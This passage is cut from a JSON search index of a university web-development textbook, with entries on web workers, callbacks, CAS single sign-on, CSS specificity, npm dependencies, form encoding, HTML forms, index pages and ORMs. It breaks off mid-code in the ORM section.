The fragment is an optional string proceeded by a hashtag (#). It identifies a portion of the resource to retrieve. It is most often used to auto-scroll to a section of an HTML document, and also for navigation in some single-page web applications.\nThus, the URL https://google.com indicates we want to use the secure HTTP scheme to access the server at google.com using its port 443. This should retrieve Google\u0026rsquo;s main page.\nSimilarly, the url https://google.com/search?q=HTML will open a Google search result page for the term HTML (Google uses the key q to identify search terms).\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/03-asynchronous-js/05-web-workers/",
	"title": "Web Workers",
	"tags": [],
	"description": "",
	"content": "As JavaScript began to be used to add more and more functionality to web applications, an important limitation began to appear. When the JavaScript interpreter is working on a big task, it stays in the event loop a long time, and does not pull events from the event queue. The result is the browser stops responding to user events\u0026hellip; and seems to be frozen. On the other hand - some programs will never end. Consider this one:\nwhile(true) { console.log(\u0026#34;thinking...\u0026#34;); } This loop has no possible exit condition, so if you ran it in the browser, it would run infinitely long\u0026hellip; and the page would never respond to user input, because you\u0026rsquo;d never pull any events of the event queue. One of the important discoveries in computer science, the Halting Problem tackles exactly this issue - and Alan Turing\u0026rsquo;s proof shows that a program to determine if another program will halt for all possible programs cannot be written.\nThus, browsers instead post warning messages after execution has run for a significant amount of time, like this one:\nSo, if we want to do a long-running computation, and not have the browser freeze up, we needed to be able to run it separately from the thread our event loop is running on. The web worker provides just this functionality.\nA web worker is essentially another JavaScript interpreter, running a script separate from the main thread. As an interpreter, it has its own event loop and its own memory space. Workers and the main thread can communicate by passing messages, which are copied onto their respective event queues. Thus, communication between the threads is asynchronous.\nAn Example You can see an example of such a web worker by using this link to open another tab in your browser. This example simulates a long-running process of n seconds either in the browser\u0026rsquo;s main thread or in a web worker. On the page is also three colored squares that when clicked, shift colors. Try changing the colors of the squares while simulating a several-second process in both ways. See how running the process on the main thread freezes the user interface?\nUsing Web Workers Web workers are actually very easy to use. A web worker is created by constructing a Worker object. It takes a single argument - the JavaScript file it will execute (which should be hosted on the same server). In the example, this is done with:\n// Set up the web worker var worker = new Worker(\u0026#39;stall.js\u0026#39;); The stall.js file contains the script the worker will execute - we\u0026rsquo;ll take a look at it in a minute.\nOnce created, you can attach a listener to the Worker. It has two events:\nmessage - a deserialized message sent from the web worker mesageerror - a message sent from the web worker that was not serializable You can use worker.addEventListener() to add these, or you can assign your event listener to the event handler properties. Those properties are:\nWorker.onmessage - triggered when the message event happens Worker.onmessageerror - triggered when the messageerror event happens Additionally, there is an error handler property:\nWorker.onerror Which triggers when an uncaught error occurs on the web worker.\nIn our example, we listen for messages using the Worker.onmessage property:\n// Set up message listener worker.onmessage = function(event){ // Signal completion document.querySelector(\u0026#39;#calculation-message\u0026#39;).textContent = `Calculation complete!`; } If the message was successfully deserialized, it\u0026rsquo;s data property contains the content of the message, which can be any valid JavaScript value (an int, string, array, object, etc). This gives us a great deal of flexibility. If you need to send more than one type of message, a common strategy is to send a JavaScript object with a type property, and additional properties as needed, i.e.:\nvar messageData1 = { type: \u0026#34;greeting\u0026#34;, body: \u0026#34;Hello! It\u0026#39;s good to see you.\u0026#34; } var messageData2 = { type: \u0026#34;set-color\u0026#34;, color: \u0026#34;#ffaacc\u0026#34; } We can send messages to the web worker with Worker.postMessage(). Again, these messages can be any valid JavaScript value:\nworker.postMessage(\u0026#34;Foo\u0026#34;); worker.postMessage(5); worker.postMessage({type: \u0026#34;greetings\u0026#34;, body: \u0026#34;Take me to your leader!\u0026#34;}); In our example, we send the number of seconds to wait as an integer parsed from the \u0026lt;input\u0026gt; element:\n// Get the number to calculate the Fibonacci number for and convert it from a string to a base 10 integer var n = parseInt(document.querySelector(\u0026#39;#n\u0026#39;).value, 10); // Stall for the specified amount of time worker.postMessage(n); Whatever data we send as the message is copied into the web worker\u0026rsquo;s memory using the structured clone algorithm. We can also optionally transfer objects to the web worker instead of copying them by providing them as a second argument. This transfers the memory holding them from one thread to the other. This makes them unavailable on the original thread, but is much faster than copying when the object is large. It is used for sending objects like ArrayBuffer, MessagePort, or ImageBitmap. Transferred objects also need to have a reference in the first argument.\nThe Web Worker Context For the JavaScript executing in the web worker, the context is a bit different. First, there is no document object model, as the web worker cannot make changes to the user interface. Likewise there is no global window object. However, many of the normal global functions and properties not related to the user interface are available, see functions and classes available to web workers for details.\nThe web worker has its own unique global scope, so any variables declared in your main thread won\u0026rsquo;t exist here. Likewise, varibles declared in the worker will not exist in the main scope either. The global scope of the worker has mirror events and properties to the Worker - we can listen for messages from the main thread using the onmessage and onmessageerror properties, and send messages back to the main thread with postMessage().\nThe complete web worker script from the example is:\n/** @function stall * Synchronously stalls for the specified amount of time * to simulate a long-running calculation * @param {int} seconds - the number of seconds to stall */ function stall(seconds) { var startTime = Date.now(); var endTime = seconds * 1000 + startTime; while(true) { if(Date.now() \u0026gt; endTime) break; } } /** * Message handler for messages from the main thread */ onmessage = function(event) { // stall for the specified amount of time stall(event.data); // Send an answer back to the main thread postMessage(`Stalled for ${event.data} seconds`); // Close the worker since we create a // new worker with each stall request. // Alternatively, we could re-use the same // worker. close(); }; Workers can also send AJAX requests, and spawn additional web workers! In the case of spawning additional workers, the web worker that creates the child worker is treated as the main thread.\nOther kinds of Web Workers The web workers we\u0026rsquo;ve discussed up to this point are basic dedicated workers. There are also several other kinds of specialized web workers:\nShared workers are shared between several scripts, possibly even running in different \u0026lt;iframe\u0026gt; elements. These are more complex than a dedicated worker and communicate via ports. See MDN\u0026rsquo;s SharedWorker article for information. Service workers act as proxy servers between the server and the web app, for the purpose of allowing web apps to be used offline. We\u0026rsquo;ll discuss these later in the semester, but you can read up on them in hte mdn ServiceWorker article. Audio workers allow for direct scripting of audio processing within a web worker context. See the mdn AudioWorker article for details. "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/05-web-servers/",
	"title": "Basic Web Servers",
	"tags": [],
	"description": "",
	"content": "Chapter 5 Basic Web Servers Serving Content via the World-Wide-Web\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/06-attaching-scripts/",
	"title": "Attaching Scripts",
	"tags": [],
	"description": "",
	"content": "Much like there are multiple ways to apply CSS to a web app, there are multiple ways to bring JavaScript into one. We can use a \u0026lt;script\u0026gt; tag with a specified src attribute to load a separate document, put our code into the \u0026lt;script\u0026gt; tag directly, or even add code to attributes of an HTML element. Let\u0026rsquo;s look at each option.\nScript Tag with Source We can add a \u0026lt;script\u0026gt; tag with a src attribute that gives a url pointing to a JavaScript file. This is similar to how we used the \u0026lt;link\u0026gt; element for CSS:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;JS Example\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script src=\u0026#34;example.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; A couple of important differences though. First, the \u0026lt;script\u0026gt; element is not a void tag, so we a closing \u0026lt;/script\u0026gt;. Also, while traditionally we would also place \u0026lt;script\u0026gt; elements in the \u0026lt;head\u0026gt;, current best practice is to place them as the last children of the \u0026lt;body\u0026gt; element.\nScript Tag with Content The reason the \u0026lt;script\u0026gt; element isn\u0026rsquo;t a void element is that you can place JavaScript code directly into it - similar to how we used the \u0026lt;style\u0026gt; element for CSS. Typically we would also place this tag at the end of the body:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;JS Example\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; console.log(1 + 3); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Why at the End of the Body? The reason for placing \u0026lt;script\u0026gt; tags at the end of the body is twofold. First, JavaScript files have grown increasingly large as web applications have become more sophisticated. And as they are parsed, there is no visible sign of this in the browser - so it can make your website appear to load more slowly when they are encountered in the \u0026lt;head\u0026gt; section. Second, JavaScript is interpreted as it is loaded - so if your code modifies part of the web page, and tries to do so before the webpage is fully loaded, it may fail.\nA good trick is to place any code that should not be run until all the web pages\u0026rsquo; assets have been downloaded within the body of an event handler tied to the 'load' event, i.e.\nwindow.addEventListener(\u0026#39;load\u0026#39;, function() { // Put any JavaScript that should not be // run until the page has finished loading // here.. }); As an Attribute A third alternative is to define our JavaScript as an on-event handler directly on an element. For example:\n\u0026lt;button onclick=\u0026#34;console.log(1+3)\u0026#34;\u0026gt;click me\u0026lt;/button\u0026gt; This once-common strategy has fallen out of favor as it does not provide for good separation of concerns, and can be difficult to maintain in large HTML files. Also, only one event handler can be set using this approach; we\u0026rsquo;ll see an alternative method, Element.addEventListener() in the next section that is more powerful.\nHowever, component-based development approaches like React\u0026rsquo;s JSX make this approach more sensible, so it has seen some resurgence in interest.\nMix-and-Match It is important to understand that all JavaScript on a page is interpreted within the same scope, regardless of what file it was loaded from. Thus, you can invoke a function in one file that was defined in a separate file - this is commonly done when incorporating JavaScript libraries like JQuery.\nWarning\nThere is one aspect you need to be aware of though. Before you reference code artifacts like functions and variables, they must have been loaded in the interpreter. If you are using external files, these have to be retrieved by the browser as a separate request, and even though they may be declared in order in your HTML, they may be received out of order, and they will be interpreted in the order they are received\nThere are a couple of strategies that can help here. First, you can use the window\u0026rsquo;s load event as we discussed above to avoid triggering any JavaScript execution until all the script files have been loaded. And second, we can combine all of our script files into one single file (a process known as concatenation). This is often done with a build tool that also minifies the resulting code. We\u0026rsquo;ll explore this strategy later in the course.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/03-asynchronous-js/06-callbacks/",
	"title": "Callbacks",
	"tags": [],
	"description": "",
	"content": " CONSOLE JavaScript implements its asynchronous nature through callbacks - functions that are invoked when an asynchronous process completes. We see this in our discussion of timers like setTimeout() and with our web workers with the onmessage event handler. These demonstrate two possible ways of setting a callback. With setTimeout() we pass the callback as a function parameter, i.e.:\nfunction timeElapsed() { console.log(\u0026#34;Time has elapsed!\u0026#34;); } // Set a timer for 1 second, and trigger timeElapsed() when the timer expires setTimeout(timeElapsed, 1000); With webworkers, we assign a function to a property of the worker (the onmessage variable):\nfunction messageReceived(message) { console.log(\u0026#34;Received \u0026#34; + message); } // Set the event listener onmessage = messageReceived; Remember, a callback is a function, and in JavaScript, functions are first-order: we can assign them as a variable or pass them as an argument to a function! We can also define a callback asynchronously as part of the argument, as we do here:\nsetTimeout(function() { console.log(\u0026#34;time elapsed\u0026#34;) }, 1000); Or using lambda syntax:\nsetTimeout(() =\u0026gt; { console.log(\u0026#34;time elapsed\u0026#34;) }, 1000); These are roughly equivalent to passing timeElapsed() in the first example - and you\u0026rsquo;ll likely see all three approaches when you read others\u0026rsquo; code.\nCallback Hell Callbacks are a powerful mechanism for expressing asynchronicity, but overuse can lead to difficult to read code - a situation JavaScript programmers refer to as \u0026ldquo;callback hell\u0026rdquo;. This problem became especially pronounced once programmers began using Node to build server-side code, as Node adopted the event-based callback asynchronous model of JavaScript for interactions with the file system,databases, etc. (we\u0026rsquo;ll cover Node in the next chapter).\nConsider this example, which logs a user into a website:\nwebapp.get(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { parseFormData(req, res, (form) =\u0026gt; { var username = form.username; var password = form.password; findUserInDatabase(username, (user) =\u0026gt; { encryptPassword(password, user.salt, (hash) =\u0026gt; { if(hash === user.passwordHash) res.setCookie({user: user}); res.end(200, \u0026#34;Logged in successfully!\u0026#34;); else res.end(403, \u0026#34;Unknown username/password combo\u0026#34;); }); }); }); }); Don\u0026rsquo;t work about the exact details of the code, but count the number of nested callbacks. There are four! And reasoning about this deeply nested code starts getting pretty challenging even for an experienced programmer. Also, handling errors in this nested structure requires thinking through the nested structure.\nThere are strategies to mitigate this challenge in writing your code, including:\nKeeping your code shallow Modularizing your code Handling every single error. The site callbackhell.com offers a detailed discussion of these strategies.\nAs JavaScript matured, additional options were developed for handling this complexity - Promises and the async and await keywords. We\u0026rsquo;ll talk about them next.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/09-auth/06-cas/",
	"title": "CAS",
	"tags": [],
	"description": "",
	"content": "Let\u0026rsquo;s start our discussion of single-sign on strategies with Central Authentication Service (CAS). We\u0026rsquo;ll do this because it is one of the more straightforward approaches to Single Sign On, and one you\u0026rsquo;ve probably used every day as a K-State student, as it is the basis of Kansas State University\u0026rsquo;s eid login system.\nCAS is a standard protocol that involves two servers and the client computer. One server is the host of the app and the other is the authentication server. The flow is fairly straightforward:\nThe user visits the app server, which determines the user is not logged in\nThe app server redirects the browser to the authentication server, providing in the url as a query parameter URL to return the authenticated user to\nThe authentication server sends the browser a login form\nThe user fills out and submits the form, which goes back to the authentication server\nIf the authentication is unsuccessful, the authentication server re-sends the form (returning to step 3). If it is successful, the authentication server redirects the user to the app server, using the URL it provided in the first redirect. It also sends a ticket (a string of cryptographic random bytes) that corresponds to the login attempt as a query parameter\nThe app server now has to verify that the ticket it received is valid (i.e. it is not counterfeit or an re-used one captured from an earlier login attempt). To do this, the app server sends a request to validate the ticket to the authentication server\nIf the authentication server sends an XML response indicating if the ticket was valid. If it is valid, this XML also includes information about the user (at a minimum the username, but it can contain additional information like email, first and last names, etc).\nOnce the app server is sure the ticket is valid, it finishes logging in the user (typically by saving their identity in a session) and sends a welcome page or the page they were attempting to access.\nThe diagram below visually shows this process:\nYou can learn more about the CAS approach at https://www.apereo.org/projects/cas.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/06-specificity/",
	"title": "CSS Specificity",
	"tags": [],
	"description": "",
	"content": "But what about two rules that conflict that appear in the same level of the cascade order? For example, given the CSS:\np { color: black; } .warning { color: red; } what would the color of \u0026lt;p class=\u0026quot;warning\u0026quot;\u0026gt; be? You might say it would be red because the .warning CSS rules come after the p rules. And that would be true if the two rules had the same specificity. An example of that is:\np {color: black} p {color: red} Clearly the two selectors are equivalent, so the second color rule overrides the first. But what if we go back to our first example, but flip the rules?\n.warning { color: red; } p { color: black; } In this case, the color is still red, because .warning is more specific than p. This is the concept of specificity in CSS, which has an actual, calculable value.\nSpecificity Calculations The specificity of a selector increases by the type and number of selectors involved. In increasing value, these are:\nType selectors and pseudo-elements Class selectors, attribute selectors, and pseudo-classes ID selectors Each of these is trumped by in-line CSS rules, which can be thought of as the highest specificity. Thus, we can think of specificity as a 4-element tuple (A, B, C, D):\nWe can then calculate the values of A,B,C,D:\nCount 1 if the declaration is from a ‘style’ attribute (inline style) rather than a rule with a selector, 0 otherwise (= A). Count the number of IDs in the selector (= B). Count the number of Classes, attributes and pseudo-classes in the selector (= C). Count the number of Element names and pseudo-elements in the selector (= D). The !important Loophole Finally, there is an extra trick that we can use when we are having trouble creating enough specificity for a CSS rule. We can add !important to the rule declaration. For example:\np { color: red !important; } The !important rule overrides any other CSS declarations, effectively sidestepping specificity calculations. It should be avoided whenever possible (by making good use of specificity), but there are occasions it might be necessary.\nIf multiple rules use !important, then their priority is again determined by specificity amongst the group.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/04-node/06-dependencies/",
	"title": "Dependencies",
	"tags": [],
	"description": "",
	"content": "A second great benefit of creating your project as a Node package is that dependencies can be managed using the Node Package Manager (npm). You can install any Node package with the command $npm install [package name]. This command looks for the corresponding package in an online repository, and if it is found, downloads it and saves it to the subdirectory node_modules in your package directory.\nIt also creates an entry in the package.json file corresponding to the package you installed, and also an entry in the package.lock.json file. The entry in your package.json file may specify a specific version, i.e.:\n{ \u0026#34;name\u0026#34;: \u0026#34;example-package\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;foo\u0026#34;: \u0026#34;2.1.3\u0026#34;, \u0026#34;bar\u0026#34;: \u0026#34;^1.1.0\u0026#34;, \u0026#34;doh\u0026#34;: \u0026#34;~4.3.2\u0026#34; } } The ^ before the \u0026quot;bar\u0026quot; dependency indicates that npm can use any minor release after this version, i.e. we could use bar 1.2.1 but not bar 2.1.1. The ~ before the \u0026quot;doh\u0026quot; dependency indicates that npm can use any patch release after this version, i.e. doh 4.3.4 but not doh 4.4.0. Because we specified the exact version for \u0026quot;foo\u0026quot;, it will always install foo 2.1.3. We could also indicate we will accept any major version with an *, but this is rarely used. Additionally, we can specify a git repo or a location on our hard drive, though these approaches are also not commonly used.\nThe reason we want the dependency information specified this way is that when we commit our package to source control, we typically exclude the dependencies found in node_modules. As this folder can get quite large, this saves us significant space in our repository. When you clone your package to a new location, you can re-install the dependencies with the command:\n$ npm install This will pull the latest version of each dependency package allowable. Additionally, some modules may have their own dependencies, in which case npm will strive to find a version that works for all requirements.\nFinally, the package.lock.json contains the exact version of the dependencies installed. It is intended to be committed to your repository, and if it exists it will make the npm install command install the exact same packages. This can help avoid problems where two versions of a package are slightly different.\nDevelopment Dependency In addition to regular dependencies, we can specify dependencies we only need during development. Adding the --save-dev flag to the command will add the package to a development dependency list in your package.json file. Development dependencies are only installed in the development environment; they are left out in a production environment.\nInfo\nThe NPM Registry There are many ways to connect with dependencies, but one of the easiest and most popular is to use the NPM Registry, a searchable, online directory of npm packages maintained by npm, Inc. You can search for keywords and (hopefully) find a project that fits your needs.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/06-form-encoding/",
	"title": "Form Encoding",
	"tags": [],
	"description": "",
	"content": "When a form is submitted as a POST request, its inputs are serialized according to the form\u0026rsquo;s encoding strategy. This value is also used as the Content-Type header of the request. The three form encoding values are:\napplication/x-www-form-urlencoded (the default) multipart/form-data (used for file uploads) text/plain (used for debugging) The \u0026lt;form\u0026gt; element\u0026rsquo;s enctype attribute can be set to any of these three possible values.\napplication/x-www-form-urlencoded This serialization format consists of key/value pairs where the keys and values are url (percent) encoded, and between each key and value is a = and between each pair is a \u0026amp;. In other words, it is the same encoding that is used in the query string - the only difference is the query string begins with a ?.\nThus, the form:\n\u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;first\u0026#34; placeholder=\u0026#34;Your first name\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;middle\u0026#34; placeholder=\u0026#34;Your middle initials\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;last\u0026#34; placeholder=\u0026#34;Your last name\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;number\u0026#34; name=\u0026#34;age\u0026#34; placeholder=\u0026#34;Your age\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Save My Info\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; When submitted by John Jacob Jingleheimer Schmidt would be encoded:\nfirst=John\u0026amp;middle=J.+J.\u0026amp;last=Schmidt\u0026amp;age=30 If we parsed this string with querystring.parse() the resulting JavaScript object would be:\n{ first: \u0026#34;John\u0026#34;, middle: \u0026#34;J. J.\u0026#34;, last: \u0026#34;Schmidt\u0026#34;, age: \u0026#34;30\u0026#34; } Warning\nIt is important to note that even though age started as a numerical value, it becomes a string in the conversion process. All values submitted in a form will be interpreted as strings on the server. If we need it to be a number again, we can always use parseInt() on it.\nmultipart/form-data There is one limitation to the application/x-www-form-urlencoded encoding strategy - there is no way to include binary data, i.e. files. If you submit a form that includes an \u0026lt;input\u0026gt; of type file and encode it with application/x-www-form-urlencoded, the value supplied by the \u0026lt;input type=\u0026quot;file\u0026quot;\u0026gt; will be the filename only. The actual body of the file will not be available. The reason is simple - there\u0026rsquo;s no easy way to put raw binary data into a text file.\nThe multipart/form-data solves this in a less-than easy way. It splits the body into blocks - one for each input. Between each block is a sequence of bytes used as a separator. These boundary bytes cannot be found in any of the file data (as if it were, that block would be split up). And each block has its own header section and body section. The header defines what the input is, and what its body contains. If it was a non-file input, it will be text, and if it was a file input, the content will be the raw bytes, encoded in base64.\nWhen the server receives this body, it must use the boundary bytes to separate the blocks, and then parse each block. There are no built-in libraries in Node for doing this, though there are many npm packages that do. We\u0026rsquo;ll also write our own from scratch so that we get a good feel for it.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/a-html/06-forms/",
	"title": "Forms",
	"tags": [],
	"description": "",
	"content": "Forms were also amongst the first additions to the HTML standard, and provide the ability to submit data to a web server. A web form is composed of \u0026lt;input\u0026gt;, \u0026lt;textarea\u0026gt;, \u0026lt;select\u0026gt; and similar elements nested within a \u0026lt;form\u0026gt; element.\nThe Form Element The form element primarily is used to organize input elements and specify how they should be submitted. In its simplest form, it is simply a tag that other elements are nested within:\n\u0026lt;form\u0026gt;\u0026lt;/form\u0026gt;\nHowever, it can be modified with a number of attributes:\naction The action attribute specifies the url that this form data should be sent to. By default, it is the page the form exists on (i.e. if the form appears on http://foo.com/bar, then it will submit to http://foo.com/bar). The url can be relative to the current page, absolute, or even on a different webserver. See the discussion of URLs in the HTTP section.\nenctype The enctype attribute specifies the format that form data will be submitted in. The most common values are application/x-www-form-urlencoded (the default), which serializes the key/value pairs using the urlencoding strategy, and multipart/form-data, which uses the multipart encoding scheme, and can interweave binary (file) data into the submission. These encoding strategies are discussed more thoroughly in the chapter on submitting form data.\nmethod The method attribute specifies the HTTP method used to submit the form. The values are usually GET or POST. If the method is not specified, it will be a GET request.\ntarget The target attribute specifies how the server response to the form submission will be displayed. By default, it loads in the current frame (the _self) value. A value of _blank will load the response in a new tab. If \u0026lt;iframe\u0026gt; elements are being used, there are additional values that work within \u0026lt;iframe\u0026gt; sets.\nThe Input Element Most inputs in a form are variations of the \u0026lt;input\u0026gt; element, specified with the type attribute. Many additional specific types were introduced in the HTML5 specification, and may not be available in older browsers (in which case, they will be rendered as a text type input). Currently available types are (an asterisk indicate a HTML5-defined type):\nbutton: A push button with no default behavior. checkbox: A check box allowing single values to be selected/deselected. It has an extra attributed checked, which is a boolean specifying if it is checked. color*: A control for specifying a color. date*: A control for entering a date (year, month, and day, with no time). datetime-local*: A control for entering a date and time, with no time zone. email: HTML5 A field for editing an e-mail address. file: A control that lets the user select a file. Use the accept attribute to define the types of files that the control can select. hidden: A control that is not displayed but whose value is submitted to the server. image: A graphical submit button. You must use the src attribute to define the source of the image and the alt attribute to define alternative text. You can use the height and width attributes to define the size of the image in pixels. month*: A control for entering a month and year, with no time zone. number*: A control for entering a number. password: A single-line text field whose value is obscured. radio: A radio button, allowing a single value to be selected out of multiple choices. range*: A control for entering a number whose exact value is not important. reset: A button that resets the contents of the form to default values. search*: A single-line text field for entering search strings. Line-breaks are automatically removed from the input value. submit: A button that submits the form. tel*: A control for entering a telephone number. text: A single-line text field. Line-breaks are automatically removed from the input value. time*: A control for entering a time value with no time zone. url*: A field for entering a URL. week*: A control for entering a date consisting of a week-year number and a week number with no time zone. In addition to the type attribute, some other commonly used input attributes are:\nname The name of the attribute, which is used to identify the submitted value (the name and value attributes define a key/value pair) value The input\u0026rsquo;s current value placeholder A string to display in the input until a value is entered (typically used as a prompt). The placeholder is never submitted as a value. readonly A boolean attribute that when true, indicates the input value cannot be changed required A boolean value indicating that the input is required to have a value before it can be submitted. tabindex Indicates the order in which inputs can be reached by hitting the tab key. For dense input forms, this can be important. disabled A boolean value that when true, means the input is disabled (does not submit a value, cannot be interacted with, and is grayed out) Other \u0026ldquo;Input\u0026rdquo; Elements In addition to the \u0026lt;input\u0026gt; element, some other elements exist that provide input-type functionality within a form, and implement the same attributes as an \u0026lt;input\u0026gt;. These are:\nTextarea The \u0026lt;textarea\u0026gt; element provides a method for entering larger chunks of text than a \u0026lt;input type=\u0026quot;text\u0026quot;\u0026gt; does. Most importantly, it preserves line-breaks (the \u0026lt;input type=\u0026quot;text\u0026quot;\u0026gt; removes them). Instead of using the value attribute, the current value appears inside the opening and closing tags, i.e.:\n\u0026lt;textarea name=\u0026#34;exampleText\u0026#34;\u0026gt; This text is displayed within the textarea \u0026lt;/textarea\u0026gt; In addition, the rows and cols attribute can be used to specify the size of the textarea in characters.\nSelect The \u0026lt;select\u0026gt; element allows you to define a drop-down list. It can contain as children, \u0026lt;option\u0026gt; and \u0026lt;optgroup\u0026gt; elements. The \u0026lt;select\u0026gt; element should have its name attribute specified, and each \u0026lt;option\u0026gt; element should have a unique value attribute. The selected \u0026lt;option\u0026gt;\u0026rsquo;s value is then submitted with the \u0026lt;select\u0026gt;\u0026rsquo;s name as a key/value pair.\nEach \u0026lt;select\u0026gt; element should also have a closing tag, and its child text is what is displayed to the user.\nThe \u0026lt;optgroup\u0026gt; provides a way of nesting \u0026lt;option\u0026gt; elements under a category identifier (a label attribute specified on the \u0026lt;optgroup\u0026gt;).\nAn example \u0026lt;select\u0026gt; using these features is:\n\u0026lt;select name=\u0026#34;headgear\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;none\u0026#34;\u0026gt;None\u0026lt;/option\u0026gt; \u0026lt;optgroup label=\u0026#34;Hats\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;ball cap\u0026#34;\u0026gt;Ball Cap\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;derby\u0026#34;\u0026gt;Derby\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;fedora\u0026#34;\u0026gt;Fedora\u0026lt;/option\u0026gt; \u0026lt;/optgroup\u0026gt; \u0026lt;optgroup value=\u0026#34;Ceremonial\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;crown\u0026#34;\u0026gt;Crown\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;mitre\u0026#34;\u0026gt;Mitre\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;war bonnet\u0026#34;\u0026gt;War Bonnet\u0026lt;/option\u0026gt; \u0026lt;/optgroup\u0026gt; \u0026lt;/select\u0026gt; Finally, multiple selections can be allowed by specifying a multiple attribute as true.\nLabels In addition to inputs, a \u0026lt;form\u0026gt; often uses \u0026lt;label\u0026gt; elements to help identify the inputs and their function. A label will typically have its for attribute set to match the name attribute of the \u0026lt;input\u0026gt; it corresponds to. When connected in this fashion, clicking the label will give focus to the input. Also, when the \u0026lt;input type=\u0026quot;checkbox\u0026quot;\u0026gt;, clicking the label will also toggle the checked attribute of the checkbox.\nFieldsets Finally, the \u0026lt;fieldset\u0026gt; element can be used to organize controls and labels into a single subcontainer within the form. Much like \u0026lt;div\u0026gt; elements, this can be used to apply specific styles to the contained elements.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/05-web-servers/06-index-pages/",
	"title": "Index Pages",
	"tags": [],
	"description": "",
	"content": "The original purpose of the World-Wide-Web was to share webpages and other digital resources across the Internet. In many ways, an early web server was like a hard drive that was open to the world. Think about the HTTP methods, \u0026quot;GET\u0026quot; is like a file read, \u0026quot;POST\u0026quot; is like a write, \u0026quot;PUT\u0026quot; and \u0026quot;PATCH\u0026quot; like a file modification, and \u0026quot;DELETE\u0026quot; was a file erasure.\nSo, just like when you browse your hard drive using Windows Explorer or other software, it was necessary for these early web pages to display an index - a listing of all the contents of a directory. You\u0026rsquo;ve seen similar in Codio if you ever used the \u0026ldquo;Project Index\u0026rdquo; option in the run menu - it displays an index of the project directory:\nThis is a pretty standard auto-generated directory listing - it provides the path to the directory being displayed, and all the contents of the directory as hyperlinks. Clicking on a file will open or download it, and clicking a directory will open that directory\u0026rsquo;s auto-generated directory listing.\nAs the use of the web expanded into commercial and public life, many web developers wanted to replace auto-generated directory listing pages with a carefully designed home page. But auto-generated directory listing pages remained an important feature for many sites that served as a more traditional file server.\nThe compromise adopted by most web servers was that if the directory contained an HTML file named index.html (or sometimes index with any extension, i.e. index.php), that page would be served in leu of an auto-generated index page. Most also allow disabling the directory listing as a configuration option.\nInfo\nYou might be wondering about security if a web server starts exposing directory structure and files willy-nilly. Most web servers will only serve files in a specific directory (often called the root directory) and its subdirectories. In a typical configuration, this root directory is named public or public_html to reinforce the idea that it is available to anyone browsing the web.\nFiles that need to have access restricted to certain people should not be placed in this directory, but be placed behind an authentication mechanism (sometimes referred to as an auth wall or pay wall for subscription-based sites). We\u0026rsquo;ll talk about this more in our chapter on authentication.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/07-persistent-storage/06-orm/",
	"title": "Object-Relational Mapping",
	"tags": [],
	"description": "",
	"content": "If you think learning and writing SQL looks challenging, you\u0026rsquo;re not alone. Early full-stack developers did as well. In addition, there was the additional need to convert the responses from the relational database from text into objects the program could use. It shouldn\u0026rsquo;t be surprising that libraries quickly were adopted to manage this process. The most basic of these are drivers, simple programs which manage the connection between the database and the program using it, sending SQL queries to the database and parsing the results into data types native to the language (usually an array of arrays or an array of dictionaries - the outer array for the rows, and the inner array or dictionary for the column values within the row).\nHowever, the use of drivers was soon supplanted by Object Relational Mapping (ORM), a software layer that sits between the database and the dynamic web server program. But unlike a driver, ORM libraries provide additional conversion logic. Most will convert function calls to SQL statements and execute them on the server, and all will convert the results of a query into an object in the language of the server.\nLet\u0026rsquo;s look at a few ORMs in practice.\nActiveRecord The ActiveRecord ORM is part of the Ruby on Rails framework. It takes advantage of the Ruby programming language\u0026rsquo;s dynamic nature to vastly simplify the code a developer must write to use a database. If we use our previous example of the database containing persons, addresses, and jobs tables, we would write classes to represent each table that inherit from the ActiveRecord base class:\n# persons.rb class Person \u0026lt; ApplicationRecord has_many :addresses has_and_belongs_to_many :jobs end # addresses.rb class Address \u0026lt; ApplicationRecord belongs_to :person end # jobs.rb class Job \u0026lt; ApplicationRecord has_and_belongs_to :person end Then, to retrieve all people we would use a query method of the Job class::\nallPeople = Person.all() Or to retrieve all doctors, we would use a query method of the Job class:\nallDoctors = Person.includes(:jobs).where(jobs: {name: 